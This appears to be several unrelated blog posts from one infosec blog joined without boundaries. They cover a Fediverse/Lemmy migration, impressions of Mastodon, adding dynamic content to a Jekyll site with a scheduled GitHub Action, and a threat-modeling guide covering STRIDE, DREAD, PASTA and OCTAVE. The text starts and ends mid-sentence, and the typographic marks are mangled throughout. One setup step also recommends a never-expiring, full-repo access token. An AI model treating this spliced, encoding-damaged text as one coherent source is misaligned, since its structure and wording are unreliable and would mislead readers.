guide to get up and running, then much as you always have (if you‚Äôre coming from Reddit), post interesting links, engage others in (civil) discussion, report posts/comments that violate community/instance rules and if there‚Äôs anything else feel free to reach out to me on Mastodon! To help get things moving, and to recapture some of the r/cybersecurity experience, I have started up some weekly discussion threads (listed below) that I hope everyone enjoys! Mentorship Monday Training Tuesday What are you working on Wednesday (&amp; on Fedia)* To be clear, I am not in this for any sort of Internet or community-clout/reputation building. There are many other infosec communities both within the Threadiverse and outside that I am also a part of and would encourage you to join. What‚Äôs important to me is the long-term survival and healthy operation of this community I have enjoyed during my career and I believe it is at risk while it remains centralized on the platforms that have no interest in anything other than monetization of content. Hope to see you all out there! Conclusion: I‚Äôll leave the pontificating for the beginning of this article. Let me conclude by simply saying, I think now is the time to embrace the Fediverse, Threadiverse, IndieWeb, whatever you want to call it. It won‚Äôt be without challenges, and I know there are technical hurdles and mental overhead, but what we lose if we don‚Äôt try has become more evident now than ever. So speak up (#threadiverse, #redditmigration, etc‚Ä¶) and help others take back their feeds. AppendicesMobile Clients: A list of Lemmy/Kbin mobile app projects.

Never fear though, what I will do is provide you an awesome, aggregated list of guides, resources, analyses and other cool stuff that has come out on the topics of Mastodon, Twitter and the greater ‚ÄúFediverse‚Äù. Now you‚Äôre thinking, ‚ÄúA bunch of lists you say? That sounds kinda boring‚Ä¶‚Äù. You‚Äôre probably right, so in addition to that I‚Äôm going to first drop my own take on Mastodon! Woooo! * Shoutout to @mttaggart@fosstodon. org who told me not to do this. Here it is anyways! * Oh, and if you‚Äôre on Mastodon, and so inclined, please give those I have referenced in this piece a follow, boost, like, w/e! They are awesome parts of this growing community. Jump to Section My Take on Mastodon Mastodon Intro Verification on Mastodon Security &amp; Privacy Infosec Community Hosting a Mastodon Instance Twitter Migration Expanded FediverseMy Take On Mastodon So FarThere is a lot about Mastodon (and the Fediverse) that I have yet to learn, but what I do know is that it has (pretty much) already surpassed what Twitter was to me in both personal and professional contexts. I had a Twitter account for years, and try as I might, I never felt quite comfortable being anything more than a passive consumer - a lurker of those in the #infosectwitter community who had big followings. Though there was of course a decent amount of discussion/engagement within the infosec Twitter world, it often seemed to me very clique-ey, reserved only to those with big followerships or with well-known personas and established circles. I also always had the sense that trying to cultivate a following on Twitter was, sorta cringey. People there seemed more interested in boosting their follower counts or their follower-to-following ratio than expanding their true community. This feeling was ever-perpetuated by the constant deluge of tweets sounding off about how many followers they had, or how close they were to a certain follower threshold, etc‚Ä¶ Look, I get it - I have a blog, a podcast, I understand why people crave followers. It‚Äôs the engagement I am after though, not so much just having my tweets/toots/posts/stuff show up in a lot of people‚Äôs timelines. I genuinely enjoy sharing my thoughts/ideas, and even moreso hearing/learning from others. Naturally, a good way to create this engagement is to network, follow a lot of people and of course, have others ‚Äúfollow‚Äù me. I never had a big following on Twitter (~190ish as of the last time I looked), and I never got much engagement there (partially because I rarely posted). I‚Äôve been on Mastodon for nearly 2 weeks and already I‚Äôve seen much better engagement (and I am not alone). Maybe it‚Äôs the novelty factor, or maybe it‚Äôs because it hasn‚Äôt had time to turn into a toxic stew, it could be because I am more actively engaging. I‚Äôm not really sure yet, but what I do know is the vibe is different. That sense of community is definitely there and I am looking to make the most of it. Alright, so I have a few other thoughts/takes on my Mastodon experience so far, and as I am want to do, I will share via a list! As others have pointed out, two reasons why Twitter always felt a bit, icky, was because of forced ads in your timeline and the bedeviling algorithm which fed not what YOU wanted into your timeline, but what Twitter thought would yield maximum engagement, which typically meant trying to fill you with rage. Mastodon is a breath of fresh air in comparison. I joined the infosec. exchange instance, which is relatively quite large (~24k and growing) and have followed nearly 400 people so far. What I‚Äôve seen across my home feed and the local timeline has been really great! No ads, literally just what I‚Äôve signed up for. I‚Äôve been consuming/scrolling most of it so far and have encountered a lot of new people and genuinely look forward to (most) of what they have to share. Mastodon is a series of unique, networked instances. When folks from other instances are boosted into my timeline, there is a sense of excitement, of exploration. For example, if I see someone with the handle @hax@supercyber. pizza, I think ‚Äúwow! I‚Äôm happy to have discovered this indvidual in the wide Fediverse, and look forward to what they post/boost into my timeline‚Äù. That hunger to follow, to connect moreso than ‚Äúget followers‚Äù is really great. I have this desire to collect as many cool instances and awesome people as I can into my following list. If you want people to follow you, or engage with you, I highly recommend spending some time to tell people what you‚Äôre all about in your account profile. Also, toss a picture of some kind in there. Anything will do. Each instance will likely have its own culture, traditions and of course rules. Spend some time trying to figure out what those are, and leverage the content warning (CW) feature to try and be a little less offensive. It‚Äôs not hard to do! Being on an instance which has a population that best shares your personal/professional interests will give you a local timeline that will help you find people to follow and consume your posts. This is true. But! With a little effort, you can, regardless of what instance you are on, curate a following of people across instances, building a home timeline that is perfect for you, void of ads or algorithmic influences. This feed/timeline will continue to grow and mature thanks to the boosts and discussions of those you follow and engage with. So spend less time trying to find the perfect instance, and more time building that list. If there is any drawback to Mastodon so far that I have seen, it is the lack of full-text search (for privacy reasons). This makes some of the intel-gathering I used to do on Twitter a bit more difficult (I‚Äôm not the only one with this sentiment). One frequent use-case was to search for info on CVEs (e. g. PoCs, research, etc‚Ä¶). To address this concern, the infosec community on Mastodon has been putting their heads together on how best to use hashtags to make intel-gathering possible on Mastodon. 1, 2, 3 MastodonIntro to Mastodon: To avoid writing a regurgitated ‚Äúhow to get started w/ Mastodon‚Äù section, I‚Äôm going to first just link to the Wired article on this - How to Get Started on Mastodon. Again, I want to emphasize - try not to stress too much on what ‚Äúinstance‚Äù you choose. This should only really affect your ‚Äúlocal‚Äù timeline, not your ability to follow those anywhere, on any instance (unless you wish to follow the dregs of the Fediverse that tend to get de-federated from the upstanding servers). Alternatively, for those that are adventurous, have some free time and are relatively tech savvy, hosting your own instance on a vanity domain is another option!

Jekyll is used by GitHub Pages, which is also the current hosting provider for Shellsharks. com. I‚Äôve been using Git Pages since the inception of my site and for the most part have no complaints. With that said, a purely static site has some limitations in terms of the types of content one can publish/expose. I recently got the idea to create a dashboard-like page which could display interesting quantitative data points (and other information) related to the site. Examples of these statistic include, total number of posts, the age of my site, when my blog was last updated, overall word count across all posts, etc‚Ä¶ Out of the box, Jekyll is limited in its ability to generate this information in a dynamic fashion. The Jekyll-infused GitHub pages engine generates the site via an inherent pages-build-deployment Git Action (more on this later) upon commit. The site will then stay static until the next build. As such, it has limited native ability to update content in-between builds/manual-commits. To solve for this issue, I‚Äôve started using a variety of techniques/technologies (listed below) to introduce more dynamic functionality to my site (and more specificially, the aforementioned statboard). Jekyll Liquid JavaScript &amp; jQuery Git Actions Advanced Git Actions (*Future Update!*)Jekyll Liquid: Though not truly ‚Äúdynamic‚Äù, Liquid* templating language is an easy, Jekyll-native way to generate static content in a quasi-dynamic way at site build time. As an example, if I wanted to denote the exact date and time that a blog post was published I might first try to use the Liquid template {{ site. time }}. What this actually ends up giving me is a time stamp for when the site was built (e. g. 2025-04-06 14:03:49 -0400), rather than the last updated date of the post itself. So instead, I can harness the posts custom front matter, such as ‚Äúupdated:‚Äù, and access that value using the tag {{ page. updated }} (so we get, __). One component on the (existing) Shellsharks statboard calculates the age of the site using the last updated date of the site (maintained in the change log), minus the publish date of the first-ever Shellsharks post. Since a static, Jekyll-based, GitHub Pages site is only built (and thus only updated) when I actually physically commit an update, this component will be out of date if I do not commit atleast daily. So how did I solve for this? Enter Git Actions. * Learn more about the tags, filters and other capabilities of Liquid here. JavaScript &amp; jQuery: Before we dive into the power of Git Actions, it‚Äôs worth mentioning the ability to add dynamism by simply dropping straight up, in-line JavaScript directly into the page/post Markdown (. md) files. Remember, Jekyll produces . html files directly from static, text-based files (like Markdown). So the inclusion of raw JS syntax will translate into embdedded, executable JS code in the final, generated HTML files. The usual rules for in-page JS apply here. One component idea I had for the statboard was to have a counter of named vulnerabilities. So how could I grab that value from the page? At first, I tried fetching the DOM element with the id in which the count was exposed. However this failed because fetching that element alone meant not fetching the JS and other HTML content that was used to actually generate that count. To solve for this, I used jQuery to load the entire page into a temporary &lt;div&gt; tag, then iterated through the list (&lt;li&gt;) elements within that div (similar to how I calculate it on the origin page), and then finally set the dashboard component to the calculated count! $('&lt;div&gt;&lt;/div&gt;'). load('/infosec-blogs', function () { var blogs = $( li ,this). length; $( #iblogs ). html(blogs);});Additional notes on the use of JS and jQuery I used Google‚Äôs Hosted Libraries to reference jQuery &lt;script src= https://ajax. googleapis. com/ajax/libs/jquery/3. 6. 0/jquery. min. js &gt;&lt;/script&gt;. Be weary of adding JS comments // in Markdown files as I noticed the Jekyll parsing engine doesn‚Äôt do a great job of new-lining, and thus everything after a comment will end up being commented. When using Liquid tags in in-line JS, ensure quotes (‚Äò‚Äô,‚Äù‚Äù) are added around the templates so that the JS code will recognize those values as strings (where applicable). The ability to add raw, arbitrary JS means there is a lot of untapped capability to add dynamic content to an otherwise static page. Keep in mind though that JS code is client-side, so you are still limited in that typical server-side functionality is not available in this context. Git Actions: Thanks to the scenario I detailed in the Jekyll Liquid section, I was introduced to the world of Git Actions. Essentially, I needed a way to force an update / regeneration of my site such that one of my staticly generated Liquid tags would update at some minimum frequency (in this case, at least daily). After some Googling, I came across this action which allowed me to do just that! Essentially, it forces a blank build using a user-defined schedule as the trigger. # File: . github/workflows/refresh. ymlname: Refreshon: schedule: - cron: '0 3 * * *' # Runs every day at 3amjobs: refresh: runs-on: ubuntu-latest steps: - name: Trigger GitHub pages rebuild run: | curl --fail --request POST \ --url https://api. github. com/repos/${{ github. repository }}/pages/builds \ --header Authorization: Bearer $USER_TOKEN env: # You must create a personal token with repo access as GitHub does # not yet support server-to-server page builds. USER_TOKEN: ${{ secrets. USER_TOKEN }}In order to get this Action going, follow these steps‚Ä¶ Log into your GitHub account and go to Settings (in the top right) ‚Äì&gt; Developer settings ‚Äì&gt; Personal access tokens. Generate new token and give it full repo access scope (More on OAuth scopes). I set mine to never expire, but you can choose what works best for you. Navigate to your GitHub Pages site repo, ***. github. io ‚Äì&gt; Settings ‚Äì&gt; Secrets ‚Äì&gt; Actions section. Here you can add a New repository secret where you give it a unique name and set the value to the personal access token generated earlier. In the root of your local site repository, create a . github/workflows/ folder (if one doesn‚Äôt already exist). Create a &lt;name of your choice&gt;. yml file where you will have the actual Action code (like what was provided above). Commit this Action file and you should be able to see run details in your repo ‚Äì&gt; Actions section within GitHub. Additional Considerations for GitHub Actions When using the Liquid tag {{ site. time }} with a Git Action triggered build, understand that it will use the time of the server which is generating the HTML, in this case the GitHub servers themselves, which means the date will be in UTC (Conversion help). Check out this reference for informaton on how to specify the time zone in the front matter of a page or within the Jekyll config file. GitHub Actions are awesome and powerful, but their are limitations to be aware of. Notably, it is important to understand the billing considerations. Free tier accounts get 2,000 minutes/month while Pro tier accounts (priced at about $44/user/year) get 3,000. For reference, the refresh action (provided above) was running (for me) at about 13 seconds per trigger. This means you could run that action over 9,000 times without exceeding the minute cap for a Free-tier account. With the above said, also consider that the default pages-build-deployment Action used by GitHub Pages to actually generate and deploy your site upon commit will also consume those allocated minutes. Upon looking at my Actions pane, I am seeing about 1m run-times for each build-and-deploy action trigger. What‚Äôs Next: I‚Äôve only just started to scratch the surface of how I can further extend and dynamize my Jekyll-based site. In future updates to this guide (or in future posts), I plan to cover more advanced GitHub Action capabilities as well as how else to add server-side functionality (maybe through serverless!) to the site. Stay tuned!

Conclusion Appendices Data Flow Diagram Threat Modeling Methodology Matrix coming soon! Tooling Terminology ReferencesIntro to Threat ModelingThreat Modeling can be defined as the process of building and analyzing representations of a system to highlight concerns about security characteristics. 1 Threat Modeling is a pro-active and iterative approach for identifying security issues and reducing risk. The output of a threat modeling exercise is a list of threats - or even better - risks, that further inform decisions in the progressive lifecycle of a system. This process can be performed prior to any code written or infrastructure deployed. This makes it very efficient in identifying potential threats, vulnerabilities and risks. Simplified Threat Modeling: There is a multitude of threat modeling methodologies, each of which have both individual uniqueness as well as mutual commonalities (Comparison Matrix). Fundamentally, each of these frameworks share the following two properties. Document Scope : Scope the to-be-modeled system by inventorying the component architecture and diagramming the composite entities + the data flows that connect them. This should yield a list of identifiable assets &amp; components, commonly visualized as a data flow diagram (DFD). Enumerate Threats : Leveraging what we know about the system (i. e. list of technology components, applicable security controls, knowledge of threat actors, potential vulnerabilities), generate a list of potential threats. The Threat Modeling Manifesto: The steps above represent an extreme distillation of the variety of threat modeling methodologies that exist today. The esteemed Threat Modeling Manifesto provides another example of a generic threat modeling process. This manifesto was created by a collective of threat modeling, security and privacy professionals. The steps they espouse are enumerated below. 1 What are we working on? What can go wrong? What are we going to do about it? Did we do a good enough job?What‚Äôs peculiar about the Threat Modeling Manifesto is the delta between their definition of threat modeling and the stated ‚Äúfour key questions‚Äù of threat modeling. To explain, they define threat modeling as‚Ä¶ ‚ÄúThreat modeling is analyzing representations of a system to highlight concerns about security and privacy characteristics. ‚Äù Whereas within their 4-step question set they also include the act of developing risk treatments (‚ÄúWhat are we going to do about it‚Äù), as well as following up on the efficacy of those applied countermeasures (‚ÄúDid we do a good enough job‚Äù). My point being, that they are a little inconsistent between how they define threat modeling and the steps taken to perform a threat model. Maybe I‚Äôm just being a bit nit-picky though‚Ä¶ * In the past, I always considered ‚ÄúThreat Modeling‚Äù in the purest sense to be limited to just questions 1 &amp; 2 from the Manifesto, or strictly, just the acts of documenting the system (inventorying components + DFD) and generating the threats. Now however, I realize that the prescription of security controls and subsequent re-factoring of threat risks is as applicable in the context of threat modeling as anything else. 26 Benefits and Characteristics of Threat Modeling: Rather than me regurgitate a bunch of benefits of threat modeling, instead peruse this great Synopsys compilation of threat modeling advantages. 2 Detect problems early in the software development life cycle (SDLC)‚Äîeven before coding begins. Spot design flaws that traditional testing methods and code reviews may overlook. Evaluate new forms of attack that you might not otherwise consider. Maximize testing budgets by helping target testing and code review. Identify security requirements. Remediate problems before software release and prevent costly recoding post-deployment. Think about threats beyond standard attacks and identify security issues unique to your application. Keep frameworks ahead of the internal and external attackers relevant to your applications. Highlight assets, threat agents, and controls to deduce components that attackers will target. Model the location of threat agents, motivations, skills, and capabilities to locate potential attackers in relation to the system architecture. So what makes a threat modeling methodology a good one? Consider now the following list of desirable traits and considerations. 25 No (or low) false positives No threat blind spots Consistency, regardless of who performs the threat modeling exercise Cost, time and resource-effective Has tool support which helps scale and automate the various threat modeling activities Suggests a process for prioritizing findings Is easy / intutitive to learn and use, regardless of technical background Has superior characteristics for specific types of systems and situationsMethodologiesThis section will detail several (13) well-known (and not so well-known) threat modeling methodologies. They are presented in no real particular order, though I will say that the first half of the list does contain a higher concentration of the more popular models. There are also methodologies I plan to cover in the future listed here.

Microsoft Threat Modeling: Microsoft‚Äôs Threat Modeling framework is comprised of five major steps. Microsoft emphasizes the importance of threat modeling as part of an organizations routine SDL practice. 3 Microsoft Threat Modeling Steps Define security requirements which reflect the legal/industry requirements, internal standards, previous incidents, known threats, data classification and business criticality of a system. Diagram the application by drawing a data flow diagram (DFD) which depicts the processes, systems, data stores, data flows and other contextual information about an application/system. Identify threats by leveraging an attack library or threat classification system such as STRIDE. Mitigate threats by developing potential risk treatments which can be implemented by system owners to address identified threats. Validate that threats have been mitigated by revisiting the threat model and adapting that model to account for changes introduced to the system as a result of previous mitigation efforts or functional changes. Alongside this approach 3, Microsoft published a threat classification system known as STRIDE. Despite STRIDE having never been a particularly effective method for enumerating attacks 28, it has nevertheless prevailed as the taxonomy of choice for the official Microsoft Threat Modeling tool which uses STRIDE for auto-enumerating potential attacks within a provided model. You know who else loves Microsoft Threat Modeling and STRIDE? GitHub! (unsurprisingly) STRIDESTRIDE is a 6*-pronged threat classification model developed by Microsoft. * STRIDE is often mistakenly referred to as a threat modeling methodology, but it is in fact just a collection of 6 somewhat 28 distinct threat classes. These threats and their respective desired security properties are listed below. 4 Threat Security Property Spoofing Authenticity Tampering Integrity Repudiation Non-Repudiability Information Disclosure Confidentiality Denial of Service (DoS) Availability Elevation of Privilege (EoP)¬†¬† Authorization * Lateral Movement (LM) 24 Least-Privilege Below is a matrix describing the STRIDE threat categories and how they typically apply to the elements of a standard data flow diagram (DFD). 25 Element S T R I D E Data Flow ¬† X ¬† X X ¬† Data Store ¬† X ¬† X X ¬† Processes X X X X X X External Entity X ¬† X ¬† ¬† ¬† DESISTDESIST is a variant of STRIDE, it stands for Dispute, Elevation of Privilege, Spoofing, Information Disclosure, Service Denial and Tampering. DREADDREAD is a threat / risk assessment model developed by Microsoft. It is comprised of the 5 metrics below. 5 Damage : Confidentiality, integrity and availability (CIA) impact. Reproducibility : How often a specified type of attack will succeed. Exploitability : Effort and expertise required to mount an attack. Affected Users : Number/type of users that could be affected. Discoverability : Likelihood of exploitation. A simple way to use DREAD to quantitatively calculate risk would be to assign a value, 1-10 across each of the metrics above for each of the known threats / vulnerabilities applicable to a system. Once complete, take the average, which will yield the final (out of 10) risk score. This is similar in some ways to how CVSS is used to score risks. In fact, DREAD maps to CVSS (v3. 1) as shown below. With all this said, the scoring methodology via DREAD is notably problematic. 28 DREAD to CVSSv3 Matrix DREAD Criteria CVSS Metric(s) CVSS Acronym Damage Impact, i. e.

PASTA is composed of a 7-stage process. These stages are listed below, with subsequent sections that cover in detail each respective stage. Stage 1: Define Objectives Stage 2: Define Technical Scope Stage 3: Application Decomposition Stage 4: Threat Analysis Cyber Threat Intelligence (CTI) Stage 5: Vulnerability &amp; Weakness Analysis Stage 6: Attack Modeling Attack Trees Stage 7: Risk &amp; Impact AnalysisFor each stage of the PASTA threat modeling process I provide an I/O flow diagram which describes the respective inputs, processes and outputs for each stage. * I do not exhaustively cover each element of the respective stages as this would prove rather tedious and even overly informative. Rather, I will describe select pieces of each stage based on the elements I deem either un-obvious or particularly opaque given the stage-specific process-flow depiction alone. Where applicable, I‚Äôll also provide additional instruction, context, commentary and analysis within each stage‚Äôs section. 6 PASTA Stage 1: Define Objectives: The inputs for Stage 1 require quite a bit of data gathering and cross-team collaboration. Some teams you may need to consult for these inputs are listed below‚Ä¶ Business Requirements: Business partners from the department the target system resides in. Functional Requirements: (Software) Engineering team(s). Information Security Policies: Security team &amp; security leadership. Regulatory Compliance Standards: GRC or Privacy team(s). Data Classification Documents: Enterprise architecture, IT or GRC teams. Work with business stakeholders to understand business objectives. To define security requirements, consider leveraging a methodology like SQUARE. For defining compliance requirements, you‚Äôll need to understand the regulatory / compliance frameworks your organization may be beholden to (and there are a lot of them). Business Impact Analysis (BIA) report: I won‚Äôt cover conducting a BIA engagement within this guide. Please reference this great resource on BIA from Ready. gov if you want to learn more. Application Profile: Any high-level description of the application and its functionality is suitable but the profile would ideally include information such as - application type (e. g. Internet-facing), data classification (e. g. public, confidential, restricted), business objectives, inherent risk, high risk transactions (e. g. yes/no), user roles, number of users, etc‚Ä¶ Like other methodologies covered in this guide, PASTA includes the development of formal security (and privacy) requirements. Personally, I think these should be implicit inputs into a threat modeling exercise, rather than an explicit output, but‚Ä¶ &lt;/shrug&gt;Compliance FrameworksCompliance is a necessary evil in the world of security and threat modeling. There is an overwhelming collection of compliance frameworks that govern industries around the world. Some examples include - Sarbanes-Oxley (SOX), PCI DSS, NIST CSF, SSAE-16, AT-101, FedRAMP, ISO, Privacy Shield, HIPAA, HITECH, SOC 2, CMMC, GDPR, CCPA, GLBA, PIPEDA, FISMA, CSA STAR, COBIT, FERPA, COPPA, NERC CIP, HEOA, HITRUST, etc‚Ä¶ 30,31 PASTA Stage 2: Define Technical Scope: Similar to Stage 1, there are other teams that will likely need to be consulted for the required inputs, e. g. the network team and engineering team(s). Technical Scope: Inventorying network, infrastructure and software components contributes to developing a holistic technical scope as well as for understanding the boundaries of a system. Example component elements include - application components, network topology, protocols/services (from existing data flow diagrams), use case scenarios (via sequence diagrams), assets (targeted data / sub-systems), security controls (e. g. authN/authZ, encryption, logging, etc‚Ä¶), data interactions (e. g. login, registration), technology types / versions, etc‚Ä¶ The technical scope derived in this stage is the basis for our understanding of the systems attack surface. PASTA Stage 3: Application Decomposition: For reference, here‚Äôs a good definition of a design document. Use case enumeration can be time-consuming and unwieldy depending on the size &amp; scope of the target system. This stage requires the development of a data flow diagram (DFD). Controls Analysis: For each use case (transaction), determine the inherent risk, data classification in scope and security functions invoked for each control type (e. g. input validation, authN/authZ, session management, encryption, etc‚Ä¶). Note: This can be done in a spreadsheet. ‚ÄúExplicit‚Äù vs ‚ÄúImplicit‚Äù trust: Are authorization (authZ) decisions made on context-aware rules (i. e. Zero Trust) or simply by whether you can communicate with something? Access Control Matrix: A formal security model that characterizes the rights of actors with respect to assets in a system. Use Case Mapping: Similar to Trike, PASTA demands the mapping of use flows. PASTA Stage 4: Threat Analysis: * I find it a little strange, or just unnecessary, to bring straight-up application / SIEM logs into a threat modeling assessment, but that‚Äôs what PASTA wants as an input in this stage‚Ä¶ Attack Scenario Probability Analysis: Probability (i. e. likelihood) is factored using a plethora of security criteria (e. g. attack vector, attack complexity, privileges required, user interaction, exploit code availability, vulnerability patch level, in-line security controls, threat actor capability, threat actor infrastructure, threat actor motivation, etc‚Ä¶) - pretty much CVSS metrics. Consider what threat intel can be developed from analyzing internal/external incident reports. Can we perform attribution? Are there identifable TTPs? Do we at a minimum have workable IoCs? PASTA asks that we perform regression analysis on security events. What does that even mean? In this context, I suppose it means analyzing security events applicable to the target system and determining whether they have any real risk-implications. Attack Scenarios are high-level descriptions of attack paths we will later model by using attack trees. We can correlate CTI to our attack scenarios by mapping industry-applicable CTI to the threats / malicious actors proposed when we developed the attack scenarios. Cyber Threat Intelligence (CTI)Cyber Threat Intelligence (CTI) is a vast discipline, and not one I‚Äôm going to try and cover exhaustively or authoritatively here. Instead, I‚Äôll cover a few key things for the purposes of understanding the application of CTI within the greater process of performing threat modeling. Let‚Äôs start with what makes something a ‚Äúthreat‚Äù. Threats can be defined as the cross-section of when a threat actor has the following‚Ä¶ Intent - The motivation/desire to attack a target. Opportunity - Accessible attack surface that contains vulnerability. Capability - Infrastructure, tooling, exploits and applicable TTPs to perform an attack. 7This is further visualized using the well-known Diamond Model (depicted below). Each line represents a relationship of how an attacker might attack a target/victim, e. g. the Adversary uses Infrastructure and known Capabilities to attack Victim. 8 Below are some other assorted thoughts and resources related to CTI. CTI-CMM - Cyber Threat Intelligence Maturity Model Chad Warner has an interesting writeup on using the Diamond Model if you want to dive deeper on this topic. Threat Intelligence can also be defined as, data that is collected, processed, and analyzed to understand a threat actor‚Äôs motives, targets, and attack behaviors. (source) One important concept to understand related to CTI is the difference between Data, Information and Intelligence. Intelligence should be actionable, enabling security teams to make better decisions. A Cyber Threat Intelligence Self-Study Plan: Part 1, Part 2 Cyber Threat Intelligence Dashboard A resource for public attribution by government organizations. Threat Actors can be modeled based on existing threat profiles. Organizations like MITRE, Crowdstrike, Dragos, Mandiant, CFR, Google TAG, Microsoft &amp; Secureworks track global threat actors and make these profiles publicly available. Organizations and representative security teams typically consume threat intel through (integrated) feeds or via published reports (typically from the organizations I just listed). Good open-source CTI projects include MISP and OpenCTI.

Controls can be mapped within the matrix to effectively mitigate the threat. Note: Similar results can be achieved from building attack trees, this is just one other medium. A traceability matrix is a 7-column table with the following fields. 10Threat Agent --&gt; Asset --&gt; Attack --&gt; Attack Surface --&gt; Attack Goal --&gt; Impact --&gt; ControlPASTA Stage 5: Vulnerability &amp; Weakness Analysis: To be honest, I‚Äôm not entirely sure what the difference between a threat tree and an attack tree is‚Ä¶ Stage 5 asks that we develop threat trees while Stage 6 then asks us derive attack trees. (??) The only difference I can divine is the latter uses attack libraries as input, so perhaps attack trees use known attack data rather than theoretical paths? Stage 5 requests the ingestion of vulnerability assessment reports, vuln-to-asset attribution and scored vulnerabilities. This can be done manually, or preferably, performed as part of a larger Vulnerability Management program (VMP). Vulnerability Catalogs and vulnerability scoring systems like CVSS are heavily used in this stage. Design Flaw Analysis: Evaluate use and abuse cases for ways an attacker might compromise a system. For documenting threats-attacks-vulns-assets, a simple list or table will suffice. Try to maintain as much elemental affinity as possible (i. e. attempt to capture the relationships between threats, attacks, vulnerabilities and assets). PASTA Stage 6: Attack Modeling: Now at Stage 6 we start to see many of the outputs from previous stages being fed back in as inputs (e. g. technical scope, decomposition, etc‚Ä¶) Attack Surface Analysis: What this means exactly is a bit ambiguous and probably open to some interpretation. Generally, I would focus on a prioritized list of surface-area components based on data criticality and surface volume. Check out CrowdStrike‚Äôs take on Attack Surface Management. Attack Trees are a big part of Stage 6. What does it mean to manage our attack library? Well we have some attack libraries we can import, so my guess is it just means to update or add to an imported library of attacks (unless of course we maintain one ourselves). This is reminiscent of TARA, Step 3: Knowledge Management. 23 Beyond the attack trees themselves, it could be additionally beneficial to map attack paths as overlays on top of the previously created DFD. Attack TreesAttack trees are hierarchical, graphical diagrams that show how low-level hostile activities interact and combine to achieve an adversary‚Äôs objectives. The goal of the attack is the root node, and the ways of achieving that goal are the leaf nodes. Like other decision trees, attack trees are inverted, with the flow beginning from the leaves up to the root. As an attacker progresses through the tree through the intermediate states, they may gain certain tactical benefits and achieve other impacts. 11,12 Here‚Äôs some more technical tid-bits on attack trees‚Ä¶ Attack trees have AND and OR nodes. For an attacker to progress, each leaf node must be achieved per the condition of its parent node. 12 You could further overlay nodes and paths with other contextual data. For example, you could associate nodes with a cost or time weight. You could also overlay security controls information. 11 Commonalities from one tree to another can be considered attack patterns. 26 A single branch on an attack tree is considered an attack path. To create a tree, first start by enumerating all possible attack goals. (Warning: Attack trees can get pretty big, so you may want to start small and build out from there). Remember, a list of attack scenarios was developed in the threat analysis stage (Stage 4). For each threat, create leaf nodes which represent the actions, weaknesses or vulnerabilities that would need to be present for the attacker to succeed. Each attack / threat / goal has a separate tree, and when combining all trees together, you create a composite attack graph. To add further context and value to an attack tree, consider the tree provided below. It adds data such as the asset affected, the use and abuse cases involved, library-mapped attack patterns and even explicitly-defined impacts! 9 Attack trees can and should be used to make security decisions. By performing an attack tree exercise, you can see if a system is vulnerable to an attack. You can also challenge existing security assumptions about a system and ultimately better understand the impact of vulnerabilities. Similarly, you can better understand the risk / impact mitigated by controls that you can overlay on or between nodes within the attack tree. * Note: In a future update to this section, I will be adding details around misuse cases in the context of attack trees. Stay tuned! Attack Tree References Attack Tree Tools Extra Reading: Guided design of attack trees: a system-based approach Extra Reading: An Evolutionary Approach of Attack Graphs and Attack Trees: A Survey of Attack ModelingPASTA Stage 7: Risk &amp; Impact Analysis: Qualitative risk analysis is subjective, using categorical associations, whereas quantitative risk analysis is objective, utilizing numerical values. 4 traditional ways to deal with risk: mitigation, transference, acceptance and avoidance. To conduct a gap analysis at a basic level, you need to know your current state and your desired state. Your desired state could align with an industry-standard security framework (e. g. ISO 27001, SOC 2 Type II, etc‚Ä¶), or it could be simply mitigating known risks to an acceptable level. Residual risk can be rudimentarily calculated by taking (Vuln * Attack * Impact) and dividing by Countermeasures. 9 There are a bunch of risk modeling frameworks that can be employed at this stage. The application risk profile I see as a high-level description of the risk the application faces as well as the risk to the business given the current state of the system. The threat matrix (in my mind) is a simpler, tabular version of the threats produced in Stage 4, coupled with the assets identified in Stage 3 and the vulnerabilities discovered in Stage 5. With a prioritized list of risks, consult one of the many control frameworks to begin building a comprehensive risk mitigation strategy, or at least a list of targeted risk treatments. Thoughts on PASTA: Phew! This methodology is a doozy‚Ä¶ I list some thoughts and extra meatballs-of-wisdom for PASTA below. To perform a PASTA-style threat model by-the-book is an incredibly huge undertaking. It requires a massive amount of data collection as inputs and an even greater amount of effort producing the litany of output artifacts required to achieve success in the final stage. Creating countless diagrams, matrices, lists, trees, graphs‚Ä¶ is VERY time-consuming. It took me a gross amount of time just to make the pretend artifacts for this guide. Attack trees are especially high LoE. Though I feel relatively comfortable in saying I‚Äôve explained the spirit of PASTA quite thoroughly, there are bits here and there that I‚Äôm sure I either misrepresented, left out or otherwise goofed on. My understanding of PASTA is based on quite a bit of open-source research, but unfortunately none of that research involved actually having access to the official book in which it is formally described. The book is like $100+ which is pretty crazy imo. For another take on a PASTA-like threat modeling approach, check out TMM from the KTH Royal Institute of Technology. TMM simplifies the process of threat modeling relative to PASTA-classic (which we know is hyper-involved) and adds the risk modeling benefits (and flair) of FAIR. VerSprite also has a PASTA + FAIR-inspired approach / tool, the Organizational Threat Model. Tony UcedaV√©lez, co-author of the OG PASTA book also happens to be CEO at VerSprite. PASTA has 3 different implementation tiers / options. 9 Blind Threat Model: Essentially stages 1 &amp; 2 of PASTA. Evidence-Driven Threat Model: Integrate organization threat telemetry (log analysis) and correlate CTI with attack trends from logs. So essentially up through Stage 4. Full Risk Based Threat Model: Run statistical/probabilistic analysis on threat data, attack sequences and attack effectiveness. In other words, all 7 stages. A sample PASTA Threat Modeling exercise from GitLab is linked here. So who uses PASTA? Well we know GitLab and Versprite do (a variation of it atleast). The secret sauce of PASTA (get it?) is its obsessive focus on threats, and mapping out exactly how those threats can be realized, or prevented. OCTAVE: Operationally Critical Threat, Asset and Vulnerability Evaluation (OCTAVE) is an organization-focused framework for identifying and managing information security risks. It was published in 1999 by researchers of the Software Engineering Institute at Carnegie Mellon. Similar to other threat modeling methodologies, OCTAVE includes steps for identifying assets, threats and vulnerabilities. OCTAVE-based assessments include 8 distinct processes across 3 phases. 13 OCTAVE VariantsIn addition to the original OCTAVE model, two variations of the methodology were also subsequently published. All 3 are listed below. 13 OCTAVE (1999) OCTAVE-S (2003) OCTAVE Allegro (~2007)The Phases &amp; Processes of OCTAVERather than provide detailed explanations of each phase and process of OCTAVE, I provide only the high-level description of each below. For more prescriptive guidance on how to accomplish the steps within each phase/process, I would recommend referencing similar sub-processes described from the other methodologies in this guide or by consulting the official OCTAVE publication **. 13 Phase 1: Organizational View - Inventory assets, develop a threat profile, gather knowledge from across the enterprise and establish security requirements. Process 1: Identify Enterprise Knowledge Process 2: Identify Operational Area Process 3: Identify Staff Knowledge Process 4: Establish Security Requirements Phase 2: Technological View - Inventory high-priority systems and identify infrastructure policy gaps, vulnerabilities and organizational weaknesses. Process 5: Map High-Priority 